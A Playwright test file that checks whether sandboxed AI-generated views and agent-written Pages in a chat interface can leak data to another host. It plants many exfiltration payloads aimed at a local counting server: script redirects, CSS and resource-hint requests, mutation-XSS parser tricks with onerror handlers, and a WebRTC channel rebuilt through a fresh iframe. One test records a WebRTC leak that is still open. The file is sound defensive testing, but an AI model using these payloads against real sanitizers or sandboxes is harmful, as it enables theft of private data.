import type { Page } from "@playwright/test";
import {
  SETTLE_MS,
  exitTest,
  expectRefused,
  linkClicks,
  refusedByShell,
  type LinkClick,
  type OtherHost
} from "./exit-fixtures";
import {
  pageExitTitle,
  pageLinkTitle,
  pageLinks,
  pageLoadExits,
  pageNavigationExits,
  pageTestTitles,
  tabOpeningClicks,
  type PageExit
} from "./page-exits";
import {
  expectOnInterface,
  expectPageRan,
  openPage,
  storePage,
  watchOpened
} from "./page-fixtures";
import { pageHeldTests } from "./page-held";
import { expect } from "./test";
import {
  apiOrigin,
  rewriteStoredDisplay,
  showView,
  signIn,
  uiOrigin,
  viewFrame,
  viewTitle
} from "./view-fixtures";
import { requestAnswered } from "./allowed-page-errors";
import { REPLACED_BUILT_INS_LINK } from "./page-exits";
// The messages this spec's tests cause on purpose (see allowed-page-errors.ts).
exitTest.use({
  allowedPageErrors: {
    errors: [
      {
        name: "planted-view-exit",
        reason:
          "Chromium's own log line for a frame it did not let move to another address. These tests " +
          "plant the move in a generated view and assert that nothing reached the other host.",
        matches:
          /^Framing '[^']*' violates the following Content Security Policy directive: "frame-src 'none'"\. The request has been blocked\.\s*$/u,
        tests: [
          "a view cannot leave its frame through location.href",
          "a view cannot leave its frame through location.assign",
          "a view cannot leave its frame through location.replace",
          "a view cannot leave its frame through a meta refresh in its document",
          "a view cannot leave its frame through a meta refresh a script adds",
          "a view cannot leave its frame through a link a script clicks outside its document",
          "a view cannot leave its frame through a download link a script clicks outside its document",
          "a view cannot move its frame to an address of the instance either"
        ]
      },
      {
        name: "page-file-that-is-not-there",
        reason:
          "Chromium's own log line: the Page of this test names a base address, the policy " +
          "refuses it, and the image beside it is then asked of the Page's own file set, which " +
          "holds no such file.",
        matches: requestAnswered(404),
        path: /^\/app-content\//u,
        tests: [
          pageExitTitle(
            pageLoadExits.find((exit) => exit.name === "a base address") ?? {
              name: "a base address"
            }
          )
        ]
      },
      {
        name: "page-that-replaced-the-built-in-methods",
        reason:
          "Thrown by the test runner, not by the product: the Page of this test replaces the " +
          "built-in methods of its document on purpose, and the recorder of a trace, which the " +
          "runner puts into the same document, reads the page with them on every step.",
        matches: /^Cannot read properties of undefined \(reading '0'\)$/u,
        tests: tabOpeningClicks.map((click) =>
          pageLinkTitle({ name: REPLACED_BUILT_INS_LINK }, click)
        )
      },
      {
        name: "page-address-in-a-tab",
        reason:
          "Chromium's own log line: the test opens the address of a Page in a tab of its own, " +
          "the instance answers 403 because only a frame is given a Page, which the test asserts.",
        matches: requestAnswered(403),
        path: /^\/app-content\//u,
        tests: [pageTestTitles.ownTab]
      }
    ]
  }
});

// A view cannot move its own frame to another host. Each test plants one way of trying in a
// view, with data in the address, and shows it in the interface. Nothing is refused by the
// test: the other host is a real server on this machine that counts what reaches it, and it
// must count nothing. That the browser refused the move is read from its own log line, so a
// test cannot pass because the view never tried.

// Every test stores its own view and counts on its own other host, so none needs another before
// it. The file holds a third of the browser suite's time, and in parallel mode the shards of
// the hosted check split it test by test instead of keeping it in one worker.
exitTest.describe.configure({ mode: "parallel" });

type ViewKind = "html.rendered" | "private_hydrated_view";

/** Stores a view of the kind and opens the conversation that shows it. */
async function openView(page: Page, kind: ViewKind, html: string): Promise<void> {
  const headers = await signIn(page, uiOrigin);
  const conversation = await showView(page.request, headers, `<h2>${viewTitle}</h2>${html}`);
  if (kind === "private_hydrated_view") {
    await rewriteStoredDisplay(conversation.id, { kind });
  }
  await page.goto(`${uiOrigin}/c/${encodeURIComponent(conversation.id)}`);
}

interface Exit {
  name: string;
  /** What the view holds to get to `address`. */
  html(address: string): string;
}

const script = (body: (address: string) => string) => (address: string) =>
  `<script>${body(JSON.stringify(address))}</script>`;

// Ways a view moves its own frame. The shell refuses each of them. The links are clicked
// outside the document, where the view's own bootstrap neither sees nor cancels them: this is
// what a script does that wants to get past that bootstrap.
const frameExits: Exit[] = [
  { name: "location.href", html: script((address) => `location.href=${address}`) },
  { name: "location.assign", html: script((address) => `location.assign(${address})`) },
  { name: "location.replace", html: script((address) => `location.replace(${address})`) },
  {
    name: "a meta refresh in its document",
    html: (address) => `<meta http-equiv="refresh" content="0;url=${address}">`
  },
  {
    name: "a meta refresh a script adds",
    html: script(
      (address) =>
        `var refresh=document.createElement("meta");refresh.httpEquiv="refresh";refresh.content="0;url="+${address};document.head.appendChild(refresh)`
    )
  },
  {
    name: "a link a script clicks outside its document",
    html: script(
      (address) => `var link=document.createElement("a");link.href=${address};link.click()`
    )
  },
  {
    name: "a download link a script clicks outside its document",
    html: script(
      (address) =>
        `var link=document.createElement("a");link.href=${address};link.download="rows";link.click()`
    )
  }
];

// A click with a modifier key or the middle button does not move the frame. It opens the
// address in a new tab or window, or downloads it, and the shell has no say in that. So a
// link in a view has no address: these tests click one in every way and count.

/** Shows a view with one link to the other host, clicks it, and counts what left. */
async function expectClickReachesNothing(
  page: Page,
  kind: ViewKind,
  click: LinkClick,
  otherHost: OtherHost
): Promise<void> {
  const opened: string[] = [];
  page.context().on("page", (popup) => opened.push(popup.url()));
  page.on("download", (download) => opened.push(download.url()));
  const address = `${otherHost.origin}/hit?click=${encodeURIComponent(click.name)}&rows=secret`;

  await openView(page, kind, `<a id="go" ${click.attributes ?? ""} href="${address}">Open</a>`);
  await expect(page.getByText("Loading view…")).toHaveCount(0);
  const link = viewFrame(page).locator("#go");
  // The link is there to be clicked, as text. Its address is gone.
  await expect(link).toHaveText("Open");
  await expect(link).not.toHaveAttribute("href");
  await link.click(click.options);

  await page.waitForTimeout(SETTLE_MS);
  expect(opened).toEqual([]);
  expect(otherHost.requests).toEqual([]);
  expect(otherHost.connections).toBe(0);
}

exitTest.describe("a view cannot move its frame to another host", () => {
  exitTest.setTimeout(60_000);

  exitTest("the other host counts what does reach it", async ({ page, otherHost }) => {
    // The same browser, the same host, and a frame nothing holds back.
    await page.goto(`${apiOrigin}/health`);
    await page.setContent(`<iframe src="${otherHost.origin}/hit?exit=control"></iframe>`);

    await expect.poll(() => otherHost.requests).toEqual(["GET /hit?exit=control"]);
    expect(otherHost.connections).toBeGreaterThan(0);
  });

  for (const exit of frameExits) {
    exitTest(
      `a view cannot leave its frame through ${exit.name}`,
      async ({ page, otherHost, refusals }) => {
        const address = `${otherHost.origin}/hit?exit=${encodeURIComponent(exit.name)}&rows=secret`;

        await openView(page, "html.rendered", exit.html(address));

        await expectRefused(page, otherHost, refusals, refusedByShell);
      }
    );
  }

  exitTest(
    "a view cannot move its frame to an address of the instance either",
    async ({ page, otherHost, refusals }) => {
      const address = `${apiOrigin}/health?from=view`;
      const asked: string[] = [];
      page.on("request", (request) => {
        if (request.url() === address) {
          asked.push(request.url());
        }
      });

      await openView(
        page,
        "html.rendered",
        `<script>location.href=${JSON.stringify(address)}</script>`
      );

      // `frame-src 'none'` names no address at all: a view can navigate nowhere.
      await expectRefused(page, otherHost, refusals, refusedByShell);
      expect(asked).toEqual([]);
    }
  );
});

exitTest.describe("a link in a view has no address", () => {
  exitTest.setTimeout(60_000);

  // Individual keys and ordinary clicks are mapped in app-content.test.ts. Keep
  // the browser's click and auxclick paths; the modified click also covers download markup.
  for (const click of linkClicks
    .filter((click) => tabOpeningClicks.includes(click.name))
    .map((click) =>
      click.options?.button === "middle" ? click : { ...click, attributes: "download" }
    )) {
    exitTest(`a view reaches no other host through ${click.name}`, async ({ page, otherHost }) => {
      await expectClickReachesNothing(page, "html.rendered", click, otherHost);
    });

    exitTest(
      `a view with private rows reaches no other host through ${click.name}`,
      async ({ page, otherHost }) => {
        await expectClickReachesNothing(page, "private_hydrated_view", click, otherHost);
      }
    );
  }
});

// A view that holds private rows runs no script and needs none to send rows away: they are
// written into its HTML on the server. Its body is therefore written anew from an allowlist
// when it is shown. These tests read the document the frame was given.

/** The document the shell gave the frame of the view. */
async function composedDocument(page: Page): Promise<string> {
  await expect(page.getByText("Loading view…")).toHaveCount(0);
  const frame = page.locator(`iframe[title="${viewTitle}"]`).first().contentFrame();
  return (await frame.locator("iframe").getAttribute("srcdoc")) ?? "";
}

exitTest.describe("a view with private rows is written from an allowlist", () => {
  exitTest.setTimeout(60_000);

  exitTest("it keeps nothing that names a host", async ({ page, otherHost }) => {
    const there = otherHost.origin;
    const host = new URL(there).host;
    const planted = [
      // Resource hints: the browser may look the host up without asking the content policy.
      `<link rel="dns-prefetch" href="//${host}">`,
      `<link rel="preconnect" href="${there}">`,
      `<link rel="prefetch" href="${there}/hit?hint=prefetch">`,
      `<link rel="stylesheet" href="${there}/hit?hint=stylesheet">`,
      '<meta http-equiv="x-dns-prefetch-control" content="on">',
      `<meta http-equiv="refresh" content="0;url=${there}/hit?exit=refresh">`,
      `<base href="${there}/">`,
      // Addresses a person can open, and elements that load one.
      `<a id="plain" href="${there}/hit?a=1" ping="${there}/hit?ping=1" target="_blank">Link</a>`,
      `<a id="fragment" href="#rows">Rows</a>`,
      `<map name="m"><area shape="rect" coords="0,0,9,9" href="${there}/hit?area=1"></map>`,
      `<form action="${there}/hit"><input name="rows" value="secret"><button formaction="${there}/hit?f=1">Send</button></form>`,
      `<iframe src="${there}/hit?frame=1"></iframe>`,
      `<iframe srcdoc="&lt;a href='${there}/hit?nested=1'&gt;x&lt;/a&gt;"></iframe>`,
      `<object data="${there}/hit?object=1"></object><embed src="${there}/hit?embed=1">`,
      `<img id="outside" alt="outside" src="${there}/hit?img=1">`,
      `<img id="set" alt="set" srcset="${there}/hit?srcset=1 1x">`,
      `<svg id="drawing" width="20" height="20"><a href="${there}/hit?svg=1"><rect width="9" height="9"/></a><image href="${there}/hit?image=1"/><use href="${there}/hit?use=1#x"/><circle id="dot" cx="5" cy="5" r="4" fill="url(${there}/hit?fill=1)"/></svg>`,
      `<style>@import url("${there}/hit?import=1");</style>`,
      `<style>p{background:url(${there}/hit?css=1)}</style>`,
      `<style>p{background:u\\72l(${there}/hit?escaped=1)}</style>`,
      `<p id="styled" style="background:url('${there}/hit?style=1')" onclick="location.href='${there}'">Styled</p>`,
      `<script>document.body.setAttribute("data-ran","true")</script>`,
      // What a static view is made of stays.
      "<style>#kept{color:rgb(1, 2, 3)}</style>",
      '<table><tr><th scope="col">Status</th></tr><tr><td id="kept" colspan="1" style="font-weight:700">open</td></tr></table>',
      '<img id="inline" alt="inline" width="1" height="1" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">'
    ].join("");

    await openView(page, "private_hydrated_view", planted);
    const composed = await composedDocument(page);
    const view = viewFrame(page);

    // No address of the other host is anywhere in the document, in any spelling.
    expect(composed).not.toContain(host);
    expect(composed).not.toContain("@import");
    await expect(
      view.locator(
        "link, base, area, map, form, input, button, iframe, object, embed, script, image, use, [href], [ping], [target], [srcset], [onclick]"
      )
    ).toHaveCount(0);
    // The only meta elements are the three the composer writes: policy, charset, viewport.
    await expect(view.locator("meta")).toHaveCount(3);
    await expect(view.locator("meta[http-equiv]")).toHaveAttribute(
      "http-equiv",
      "Content-Security-Policy"
    );
    for (const id of ["outside", "set", "styled", "dot"]) {
      await expect(view.locator(`#${id}`)).toHaveCount(1);
    }
    await expect(view.locator("#outside")).not.toHaveAttribute("src");
    await expect(view.locator("#styled")).not.toHaveAttribute("style");
    await expect(view.locator("#dot")).not.toHaveAttribute("fill");
    await expect(view.locator("#plain")).toHaveText("Link");
    await expect(view.locator("#fragment")).toHaveText("Rows");
    // The table, its style block, its inline style and the embedded image are as written.
    await expect(view.locator("#kept")).toHaveText("open");
    await expect(view.locator("#kept")).toHaveCSS("color", "rgb(1, 2, 3)");
    await expect(view.locator("#kept")).toHaveCSS("font-weight", "700");
    await expect(view.locator("#inline")).toHaveAttribute("src", /^data:image\/gif/u);
    await expect(view.locator("body")).not.toHaveAttribute("data-ran");

    await page.waitForTimeout(SETTLE_MS);
    expect(otherHost.requests).toEqual([]);
    expect(otherHost.connections).toBe(0);
  });

  exitTest(
    "it shows row text that is markup as it stands on the allowlist, or not at all",
    async ({ page, otherHost }) => {
      const there = otherHost.origin;
      const host = new URL(there).host;
      // What a template with a placeholder in markup used to become: the row closes the element
      // it was placed in and goes on as markup of its own.
      const row = `</pre><link rel="dns-prefetch" href="//${host}"><a id="row-link" href="${there}/hit?rows=secret">Details</a><img id="row-image" src="${there}/hit?img=1" onerror="location.href='${there}'"><b id="row-bold">bold</b>`;

      await openView(page, "private_hydrated_view", `<pre id="rows">[{"note":"${row}"}]</pre>`);
      const composed = await composedDocument(page);
      const view = viewFrame(page);

      expect(composed).not.toContain(host);
      await expect(view.locator("link, [href], [onerror], [src]")).toHaveCount(0);
      // Formatting a row brings along is on the list and stays; it carries no address.
      await expect(view.locator("#row-link")).toHaveText("Details");
      await expect(view.locator("#row-bold")).toHaveText("bold");
      await view.locator("#row-link").click({ modifiers: ["ControlOrMeta"] });

      await page.waitForTimeout(SETTLE_MS);
      expect(otherHost.requests).toEqual([]);
      expect(otherHost.connections).toBe(0);
    }
  );

  exitTest(
    "it keeps an image only when it is a raster image held in its address",
    async ({ page, otherHost }) => {
      const there = otherHost.origin;
      const png =
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
      // An SVG image loads nothing while it is an image. Opened in a tab of its own it is a
      // document, and this link in it works.
      const svg = `<svg xmlns='http://www.w3.org/2000/svg'><a href='${there}/hit?row=secret'><text y='12'>Details</text></a></svg>`;
      const refused = [
        `data:image/svg+xml,${encodeURIComponent(svg)}`,
        `data:image/svg+xml;base64,${Buffer.from(svg).toString("base64")}`,
        `DATA:IMAGE/SVG+XML,${encodeURIComponent(svg)}`,
        `  data:image/svg+xml,${encodeURIComponent(svg)}  `,
        `\tdata:image/svg+xml;base64,${Buffer.from(svg).toString("base64")}`,
        `data:image/png;x=,image/svg+xml,${encodeURIComponent(svg)}`,
        `data:text/html,${encodeURIComponent(`<a href="${there}/hit?row=secret">Details</a>`)}`,
        `data:,${encodeURIComponent(svg)}`,
        "blob:null/3f0e2a52-7f2c-4a43-9d57-0c1f1f5a8b11",
        `${there}/hit?img=1`
      ];
      const kept = [
        `data:image/png;base64,${png}`,
        `DATA:IMAGE/PNG;BASE64,${png}`,
        ` data:image/png;base64,${png} `
      ];
      const image = (source: string, name: string) =>
        `<img class="${name}" alt="${name}" width="1" height="1" src="${source.replaceAll("&", "&amp;").replaceAll('"', "&quot;")}">`;

      await openView(
        page,
        "private_hydrated_view",
        [
          ...refused.map((source) => image(source, "refused")),
          ...kept.map((source) => image(source, "kept"))
        ].join("")
      );
      const composed = await composedDocument(page);
      const view = viewFrame(page);

      expect(composed).not.toContain(new URL(there).host);
      expect(composed.toLowerCase()).not.toContain("svg");
      expect(composed).not.toContain("blob:null");
      expect(composed).not.toContain("text/html");
      await expect(view.locator("img.refused")).toHaveCount(refused.length);
      await expect(view.locator("img.refused[src]")).toHaveCount(0);
      await expect(view.locator("img.kept")).toHaveCount(kept.length);
      await expect(view.locator("img.kept[src]")).toHaveCount(kept.length);
      await expect(view.locator("img.kept").first()).toHaveAttribute(
        "src",
        `data:image/png;base64,${png}`
      );

      await page.waitForTimeout(SETTLE_MS);
      expect(otherHost.requests).toEqual([]);
      expect(otherHost.connections).toBe(0);
    }
  );

  // The writer runs here on the tree Chromium's parser makes, not on a stub. These are the
  // places where what a parser reads and what it reads again from its own output differ.
  exitTest(
    "it writes nothing that reads differently the second time",
    async ({ page, otherHost }) => {
      const there = otherHost.origin;
      const link = (name: string) => `<a href="${there}/hit?${name}=1" onclick="x()">${name}</a>`;
      const planted = [
        // Read as elements where no script runs, as text where one does.
        `<noscript><p title="</noscript>${link("noscript").replaceAll('"', "&quot;")}">n</p></noscript>`,
        `<noscript>${link("noscript-child")}</noscript>`,
        // Its content is in a tree of its own.
        `<template>${link("template")}<script>x()</script></template>`,
        // The first closing tag ends a style block, whatever the CSS says.
        `<style><!--</style>${link("style-comment")}--></style>`,
        `<style>#kept::after{content:"</style>${link("style-string")}"}</style>`,
        `<style>#gone{color:red}/*<b>*/</style>`,
        "<style>#kept{color:rgb(1, 2, 3)}</style>",
        `<textarea></textarea>${link("after-textarea")}`,
        `<textarea>${link("textarea")}</textarea>`,
        `<title>${link("title")}</title><xmp>${link("xmp")}</xmp><plaintext-x>${link("unknown")}</plaintext-x>`,
        // In SVG and MathML a style block is markup, and some elements switch back to HTML.
        `<svg><style>${link("svg-style")}</style><desc>${link("svg-desc")}</desc><foreignObject>${link("foreign")}</foreignObject><title>${link("svg-title")}</title><rect id="shape" width="9" height="9"/></svg>`,
        `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=location.href='${there}'&gt;"></table></mtext><mi>${link("math")}</mi></math>`,
        `<svg></p><style><a id="</style><img src=1 onerror=location.href='${there}'>"></svg>`,
        // Comments are not written, and an attribute value that closes one stays a value.
        `<!--${link("comment")}--><!--><a href="${there}/hit?short=1">short</a>-->`,
        `<p id="titled" title="--><a href=x>">titled</p>`,
        '<p id="kept">kept</p>'
      ].join("");

      await openView(page, "private_hydrated_view", planted);
      const composed = await composedDocument(page);
      const view = viewFrame(page);

      // No address survives in any place the view's own parser reads as markup or as an address.
      await expect(
        view.locator(
          "[href], [src], [onclick], [onerror], script, noscript, template, textarea, title, xmp, math, desc, foreignObject, svg style, svg a, plaintext-x"
        )
      ).toHaveCount(0);
      expect(composed).not.toContain("<!--");
      expect(composed).not.toContain("onerror=");
      expect(composed).not.toContain('href="');
      // The links that stood outside what was left out are there as text without an address.
      const links = view.locator("a");
      await expect(links).toHaveText(["style-comment", "style-string", "after-textarea", "short"]);
      await expect(view.locator("#titled")).toHaveAttribute("title", "--><a href=x>");
      await expect(view.locator("#shape")).toHaveCount(1);
      await expect(view.locator("#kept")).toHaveText("kept");
      await expect(view.locator("#kept")).toHaveCSS("color", "rgb(1, 2, 3)");

      await page.waitForTimeout(SETTLE_MS);
      expect(otherHost.requests).toEqual([]);
      expect(otherHost.connections).toBe(0);
    }
  );
});

// WebRTC is not HTTP: a script names a server and the browser sends it UDP packets. No content
// policy and no sandbox flag forbids that today.

/**
 * Opens a WebRTC connection towards `stunServer`. The view's bootstrap has removed the
 * constructor from the view's own window, so the script writes a frame of its own that holds
 * a copy of itself: the copy passes the view's policy by the same hash, and its window is new.
 */
function webRtcScript(stunServer: string): string {
  return `<script>(function(){if(typeof RTCPeerConnection==="undefined"){addEventListener("message",function(event){if(event.data==="offered"){document.body.setAttribute("data-offered","true")}});var frame=document.createElement("iframe");frame.srcdoc="<body><script>"+document.currentScript.text+"<\\/script>";document.body.appendChild(frame);return}var peer=new RTCPeerConnection({iceServers:[{urls:${JSON.stringify(stunServer)}}]});peer.createDataChannel("rows");peer.createOffer().then(function(offer){return peer.setLocalDescription(offer)}).then(function(){parent.postMessage("offered","*")})})();</script>`;
}

exitTest.describe("WebRTC from a view", () => {
  exitTest.setTimeout(60_000);

  exitTest("a view finds no WebRTC constructor under its name", async ({ page }) => {
    await openView(
      page,
      "html.rendered",
      `<script>document.body.setAttribute("data-webrtc",[typeof RTCPeerConnection,typeof webkitRTCPeerConnection,typeof mozRTCPeerConnection].join(","))</script>`
    );

    // Hardening only: the next test gets the constructor back.
    await expect(viewFrame(page).locator("body")).toHaveAttribute(
      "data-webrtc",
      "undefined,undefined,undefined"
    );
  });

  exitTest(
    "a view that runs scripts still sends WebRTC packets (known and open)",
    { tag: "@known-open" },
    async ({ page, otherHost }) => {
      await openView(page, "html.rendered", webRtcScript(otherHost.stunServer));
      await expect(viewFrame(page).locator("body")).toHaveAttribute("data-offered", "true");
      // A positive packet is the completion condition of this known-open probe.
      await expect.poll(() => otherHost.packets).toBeGreaterThan(0);

      // Everything above must work. Only the count below is expected to fail, and when it one
      // day holds, a browser has closed WebRTC for such a frame: then this is an ordinary test,
      // and views with private rows may run scripts again.
      exitTest.fail(true, "Known and open: a script-enabled view can send WebRTC packets.");
      expect(otherHost.packets).toBe(0);
    }
  );

  exitTest("a view with private rows sends no WebRTC packet", async ({ page, otherHost }) => {
    await openView(page, "private_hydrated_view", webRtcScript(otherHost.stunServer));
    await expect(viewFrame(page).getByRole("heading", { name: viewTitle })).toBeVisible();
    await expect(page.getByText("Loading view…")).toHaveCount(0);
    // The loaded frame explicitly forbids scripts, so no delayed offer can run.
    await expect(viewFrame(page).owner()).toHaveAttribute(
      "sandbox",
      /^(?!.*\ballow-scripts\b).*$/u
    );

    // Its frame runs no script, so nothing in it can open a connection.
    await expect(viewFrame(page).locator("body")).not.toHaveAttribute("data-offered");
    expect(otherHost.packets).toBe(0);
  });
});

// A Page is HTML and script an agent wrote, served by the instance as files. It is held like a
// view: the instance answers every HTML file as a shell with the Page in a frame inside, and
// the header of that answer is the policy of both. The Page runs scripts, so every way out is
// tried here by a script or by a person, with the same other host counting what arrives.

async function expectPageExitRefused(
  page: Page,
  exit: PageExit,
  otherHost: OtherHost,
  refusals: string[]
): Promise<void> {
  const opened = watchOpened(page);
  const view = await openPage(page, {
    html: exit.html?.(otherHost.origin),
    script: exit.script?.(otherHost.origin),
    files: { "assets/worker.js": 'postMessage("started");', ...exit.files?.(otherHost.origin) }
  });

  if (exit.act) {
    // What a person does in the Page. The Page is there to be acted on once its script ran.
    await expectPageRan(page);
    await view.locator(exit.act.target)[exit.act.how]();
  }
  if (exit.refusal) {
    await expectRefused(page, otherHost, refusals, exit.refusal);
  } else {
    await expectPageRan(page);
    await page.waitForTimeout(SETTLE_MS);
  }
  if (exit.shows) {
    await expect(view.locator("body")).toHaveAttribute(exit.shows.attribute, exit.shows.value);
  }
  expect(opened).toEqual([]);
  expectOnInterface(page);
  expect(otherHost.requests).toEqual([]);
  expect(otherHost.connections).toBe(0);
}

exitTest.describe("a Page cannot reach another host or the page that holds it", () => {
  exitTest.setTimeout(60_000);

  exitTest(
    "the other host counts a click that opens a tab from a frame nothing guards",
    async ({ page, otherHost }) => {
      // What the tests below would see if a Page kept an address on a link.
      const opened = watchOpened(page);
      await page.goto(`${apiOrigin}/health`);
      await page.setContent(
        `<iframe sandbox="allow-scripts" srcdoc="<a id='go' href='${otherHost.origin}/hit?click=control'>Open</a>"></iframe>`
      );
      await page
        .frameLocator("iframe")
        .locator("#go")
        .click({ modifiers: ["ControlOrMeta"] });

      await expect.poll(() => otherHost.requests).toEqual(["GET /hit?click=control"]);
      await expect.poll(() => opened).toHaveLength(1);
    }
  );

  for (const exit of [...pageNavigationExits, ...pageLoadExits]) {
    exitTest(pageExitTitle(exit), async ({ page, otherHost, refusals }) => {
      await expectPageExitRefused(page, exit, otherHost, refusals);
    });
  }

  exitTest(pageTestTitles.instanceAddress, async ({ page, otherHost, refusals }) => {
    const address = `${apiOrigin}/health?from=page`;
    const asked: string[] = [];
    page.on("request", (request) => {
      if (request.url() === address) {
        asked.push(request.url());
      }
    });

    await openPage(page, { script: `location.href = ${JSON.stringify(address)};` });

    // `frame-src 'none'` names no address at all: a Page can navigate nowhere, also not to
    // another file of its own file set.
    await expectRefused(page, otherHost, refusals, refusedByShell);
    expect(asked).toEqual([]);
  });

  // Ordinary link fixtures coexist without changing each other's document or built-ins.
  // A shared Page lets the full observation window run after the last click, with every
  // earlier link still alive. Guard-bypass fixtures keep their own Page and observation.
  const groups = [
    pageLinks.filter((link) => !link.bypass),
    ...pageLinks.filter((link) => link.bypass).map((link) => [link])
  ];
  for (const links of groups) {
    const clicks = linkClicks.filter(
      (click) => click.attributes === undefined && tabOpeningClicks.includes(click.name)
    );
    for (const click of clicks) {
      const titleLink =
        links.length === 1 ? links[0] : { name: "the seven stripped link variants", target: "" };
      if (!titleLink) throw new Error("A link group must not be empty");
      exitTest(pageLinkTitle(titleLink, click.name), async ({ page, otherHost }) => {
        const opened = watchOpened(page);
        const address = `${otherHost.origin}/hit?click=${encodeURIComponent(click.name)}&rows=secret`;
        const scripts = links.map((link) => link.script?.(address) ?? "");
        const view = await openPage(page, {
          html: links.map((link) => link.html?.(address) ?? "").join(""),
          script:
            links.length === 1
              ? scripts[0]
              : scripts.map((body) => `(() => {${body}})();`).join("\n")
        });
        const expectNothingLeft = () => {
          expect(opened).toEqual([]);
          expectOnInterface(page);
          expect(otherHost.requests).toEqual([]);
          expect(otherHost.connections).toBe(0);
        };
        for (const link of links) {
          await exitTest.step(link.name, async () => {
            await expectPageRan(page);
            const target = view.locator(link.target);
            await expect(target).toBeVisible();
            if (!link.hidden) {
              await expect(target).toHaveText("Open");
              await expect(target).not.toHaveAttribute("href");
              await expect(target).not.toHaveAttribute("xlink:href");
              await expect(target).not.toHaveAttribute("ping");
            }
            if (link.shows) {
              await expect(view.locator("body")).toHaveAttribute(
                link.shows.attribute,
                link.shows.value
              );
            }
            await target.click(click.options);
            expectNothingLeft();
          });
        }
        // Every clicked element remains in the document throughout this full window.
        await page.waitForTimeout(SETTLE_MS);
        expectNothingLeft();
      });
    }
  }
});

exitTest.describe("a Page is held where the interface put it", () => {
  exitTest.setTimeout(60_000);

  exitTest(pageTestTitles.ownTab, async ({ page }) => {
    const headers = await signIn(page, uiOrigin);
    const stored = await storePage(page, headers, { html: '<p id="planted">planted</p>' });

    // Opened in a tab, the shell would be a page an agent wrote under the instance's address.
    const answer = await page.goto(stored.url);
    expect(answer?.status()).toBe(403);
    await expect(page.locator("iframe")).toHaveCount(0);
    for (const file of ["index.html", "assets/main.js", "assets/style.css"]) {
      const asTab = await page.goto(`${stored.url}${file}`);
      expect(asTab?.status(), file).toBe(403);
    }
    // The address is bound to its file set: with one character of the token changed it is
    // nothing, and every answer carries the header that holds a Page in.
    const altered = stored.url.replace(/.\/$/u, (end) => (end === "A/" ? "B/" : "A/"));
    const refused = await page.request.get(`${altered}assets/main.js`);
    expect(refused.status()).toBe(404);
    expect(refused.headers()["content-security-policy"]).toContain(
      "sandbox allow-scripts allow-forms allow-downloads;"
    );
  });

  exitTest(pageTestTitles.otherSite, async ({ page, otherHost, refusals }) => {
    const headers = await signIn(page, uiOrigin);
    const stored = await storePage(page, headers, {});

    await page.goto(`${otherHost.origin}/holder`);
    await page.evaluate((address) => {
      const frame = document.createElement("iframe");
      frame.src = address;
      document.body.appendChild(frame);
    }, stored.url);

    await expect
      .poll(() =>
        refusals.filter((text) =>
          /^Framing '[^']*' violates the following Content Security Policy directive: "frame-ancestors 'self' /u.test(
            text
          )
        )
      )
      .toHaveLength(1);
    await expect(
      page.frameLocator("iframe").frameLocator("iframe").locator("#page-title")
    ).toHaveCount(0);
  });

  exitTest(pageTestTitles.noFrames, async ({ page, otherHost }) => {
    const inner = `${apiOrigin}/never`;
    const asked: string[] = [];
    page.on("request", (request) => {
      if (request.url().endsWith("/assets/inner.js")) {
        asked.push(request.url());
      }
    });
    const link = `<a id='go' href='${otherHost.origin}/hit?nested=1'>Open</a>`;
    const nested = `${link}<script src='assets/inner.js'></script>`;

    // A frame a Page writes is a document of its own: its links keep their addresses and the
    // Page's guard does not run in it. So a Page has none, however often it adds one.
    const view = await openPage(page, {
      html: `<iframe srcdoc="${nested}"></iframe><p id="after">after</p>`,
      script: `const add = () => { const frame = document.createElement("iframe"); frame.srcdoc = ${JSON.stringify(nested)}; document.body.appendChild(frame); const host = document.createElement("div"); document.body.appendChild(host); const inShadow = document.createElement("iframe"); inShadow.srcdoc = ${JSON.stringify(nested)}; host.attachShadow({ mode: "closed" }).appendChild(inShadow); }; add(); setInterval(add, 5);`,
      files: { "assets/inner.js": `fetch(${JSON.stringify(inner)});` }
    });
    await expectPageRan(page);
    await expect(view.locator("#after")).toHaveText("after");
    await page.waitForTimeout(SETTLE_MS);

    await expect(view.locator("iframe, frame, object, embed")).toHaveCount(0);
    expect(asked).toEqual([]);
    expect(otherHost.requests).toEqual([]);
    expect(otherHost.connections).toBe(0);
  });

  // WebRTC is known and open for a view that runs scripts, and the test above that says so
  // stands. A Page is not a boundary against it either: nothing but its guard, a script in the
  // Page's own realm, is in the way. What this test holds is narrower. The names are gone, and
  // the way a view gets them back, a frame of its own, is not there in a Page.
  exitTest(pageTestTitles.webRtc, async ({ page, otherHost }) => {
    const open = `parent.postMessage("child-started", "*"); var peer = new RTCPeerConnection({ iceServers: [{ urls: ${JSON.stringify(otherHost.stunServer)} }] }); peer.createDataChannel("rows"); peer.createOffer().then(function (offer) { return peer.setLocalDescription(offer); }).then(function () { parent.postMessage("offered", "*"); });`;

    const view = await openPage(page, {
      script: [
        `document.body.setAttribute("data-webrtc", [typeof RTCPeerConnection, typeof webkitRTCPeerConnection, typeof mozRTCPeerConnection].join(","));`,
        `let childStarted = false; addEventListener("message", (event) => { if (event.data === "child-started") childStarted = true; if (event.data === "offered") document.body.setAttribute("data-offered", "true"); if (event.data === "observe-child") { document.body.setAttribute("data-child-connected", String(frame.isConnected)); document.body.setAttribute("data-child-started", String(childStarted)); } });`,
        `const frame = document.createElement("iframe"); frame.srcdoc = "<script src='assets/rtc.js'></scr" + "ipt>"; document.body.appendChild(frame); setTimeout(() => { window.postMessage("observe-child", "*"); }, 0);`
      ].join("\n"),
      files: { "assets/rtc.js": open }
    });
    await expectPageRan(page);
    await expect(view.locator("body")).toHaveAttribute(
      "data-webrtc",
      "undefined,undefined,undefined"
    );
    // The next task observes the guard's removal; the child's script never reached its constructor.
    await expect(view.locator("body")).toHaveAttribute("data-child-connected", "false");
    await expect(view.locator("body")).toHaveAttribute("data-child-started", "false");
    await expect(view.locator("iframe")).toHaveCount(0);

    await expect(view.locator("body")).not.toHaveAttribute("data-offered");
    expect(otherHost.packets).toBe(0);
  });

  for (const held of pageHeldTests) {
    exitTest(held.title, async ({ page, otherHost, refusals }) => {
      await held.run({ page, otherHost, refusals });
    });
  }

